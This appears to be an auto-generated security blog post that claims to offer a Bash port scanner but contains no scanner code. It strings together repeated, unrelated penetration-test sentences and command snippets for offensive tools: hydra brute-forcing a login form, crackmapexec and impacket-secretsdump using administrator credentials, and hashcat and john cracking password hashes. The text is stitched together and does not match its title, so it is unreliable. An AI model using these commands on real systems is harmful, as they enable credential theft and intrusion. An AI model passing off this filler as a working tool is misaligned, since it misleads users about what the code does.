---
TitleSEO: "Automated Port Scanner in Bash | ZureFX"
TitlePost: "Automated Port Scanner — Bash"
Author: "ZureFX"
Description: "A Bash script for automated port scanner. Built for security research and automation."
Keywords: "tool, scanner, c, bash"
URL: "https://zurefx.github.io/scripting/script-automated-port-scanner-335.html"
URL_IMAGES: ""
Date: "2025-09-17"
Tags: "Tool, Scanner, C, Bash"
Section: "scripting"
Lang: "en"
main_img: "script-automated-port-scanner-335"
Permalink: "/scripting/script-automated-port-scanner-335.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Bash** for offensive security automation.

### Requirements

- Bash
- `impacket`
- `wmiexec`
- `enum4linux`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
gobuster dir -u http://10.16.154.211/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code.

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.103.114.204 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.77.169.35/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.59.133.119 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.42.226.187
```

## Usage

### Basic Usage

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
gobuster dir -u http://10.59.79.97/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.118.136.105 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Output

### Example Output

The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 7 results
[+] Done in 20.64s
```
